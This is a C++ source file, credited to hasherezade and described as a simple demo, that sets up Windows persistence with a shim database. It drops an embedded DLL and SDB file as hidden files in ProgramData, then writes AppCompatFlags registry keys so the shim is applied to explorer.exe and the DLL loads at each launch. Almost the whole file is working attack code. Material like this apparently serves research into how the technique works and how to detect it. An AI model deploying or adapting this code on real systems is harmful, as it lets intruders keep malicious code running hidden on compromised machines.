// Persistence via Shim database
// This is just a simple demo
// CC-BY hasherezade

#include <windows.h>
#include "resource.h"
#include <stdio.h>
#include <string>

bool install_sdb32(std::string shim_name, std::string shim_path, std::string app_name)
{
    printf("[*] Trying to install: %s\n", shim_name.c_str());
    HKEY dstBaseKey = NULL;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags", 0, KEY_WRITE, &dstBaseKey) != ERROR_SUCCESS) {
        printf("[-] Failed to open base key!\n");
        return false;
    }

    std::string sdbKey = "InstalledSDB\\" + shim_name;
    printf("[*] Trying to make a new key: %s\n", sdbKey.c_str());
    HKEY hDstKey = NULL;
    if (RegCreateKey(dstBaseKey, sdbKey.c_str(), &hDstKey) != ERROR_SUCCESS) {
        printf("[-] Failed to create SDB key\n");
        RegCloseKey(hDstKey);
        return false;
    }

    shim_name = shim_name +  ".sdb";

    DWORD val_len = shim_path.length();
    if (RegSetValueExA(hDstKey, "DatabasePath", 0, REG_SZ, (BYTE*) shim_path.c_str(), val_len) != ERROR_SUCCESS) {
        printf("[-] Failed to write DatabasePath\n");
        RegCloseKey(hDstKey);
        return false;
    }
    
    DWORD db_type = 0x10000;
    if (RegSetValueExA(hDstKey, "DatabaseType", 0, REG_DWORD, (BYTE*) &db_type, sizeof(DWORD)) != ERROR_SUCCESS) {
        printf("[-] Failed to write DatabaseType\n");
        RegCloseKey(hDstKey);
        return false;
    }

    std::string appKey = "Custom\\" + app_name;
    printf("[*] Trying to make a new key: %s\n", appKey.c_str());
    if (RegCreateKey(dstBaseKey, appKey.c_str(), &hDstKey) != ERROR_SUCCESS) {
        RegCloseKey(hDstKey);
        return false;
    }

    val_len = shim_path.length();
    BYTE buf[8] = {0};
    val_len = sizeof(buf);
    if (RegSetValueExA(hDstKey, shim_name.c_str(), 0, REG_BINARY, (BYTE*) buf, val_len) != ERROR_SUCCESS) {
        RegCloseKey(hDstKey);
        return false;
    }
    RegCloseKey(hDstKey);
    return true;
}



BOOL writeToFile(char* res_data, DWORD res_size, const char *payloadName)
{
    HANDLE hFile = CreateFile(payloadName, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);
    if (hFile == NULL) return FALSE;

    DWORD written = 0;
    BOOL isDropped = WriteFile(hFile, res_data, res_size, &written, NULL);
    CloseHandle(hFile);

    if (isDropped == TRUE) {
    if (res_size != written) { //failed to write full buffer
            DeleteFile(payloadName);
            return FALSE;
        }
    }
    return TRUE;
}

BOOL dropResource(const char *payloadName, int res_id)
{
    HMODULE hInstance = GetModuleHandle(NULL);
    HRSRC res = FindResource(hInstance, MAKEINTRESOURCE(res_id), RT_RCDATA);
    if (!res) return FALSE;

    HGLOBAL res_handle  = LoadResource(NULL, res);
    if (res_handle == NULL) return FALSE;

    char* res_data = (char*) LockResource(res_handle);
    DWORD res_size = SizeofResource(NULL, res);

    /* you can now use the resource data */
    BOOL isDropped = writeToFile(res_data, res_size, payloadName);

    /* free resource after using*/
    FreeResource(res_handle);
    return isDropped;
}

int main(int argc, char *argv[])
{
    std::string app_name = "explorer.exe"; //the application to be patched
    std::string sdb_name = "{5426aa69-be6d-4c5a-b2c0-160900adcd3f}"; //GUID of SDB
    std::string dll_path = "C:\\ProgramData\\demo.dll";
    std::string shim_path = "C:\\ProgramData\\" + sdb_name + ".sdb";

    if (dropResource(dll_path.c_str(), MY_RESOURCE1) == FALSE) {
        printf("[-] Dropping DLL failed!\n");
        return (-1);
    }
    if (dropResource(shim_path.c_str(), MY_RESOURCE2) == FALSE) {
        printf("[-] Dropping shim failed!\n");
        return (-1);
    }
    printf("[+] Dropped elements.\n");
    
    if (install_sdb32(sdb_name, shim_path, app_name)) {
        printf("[+] SDB installed.\n");
    } else {
        printf("[-] SDB installation failed. Try to run it as Administrator!\n");
    }

    system("pause");

    return 0;
}
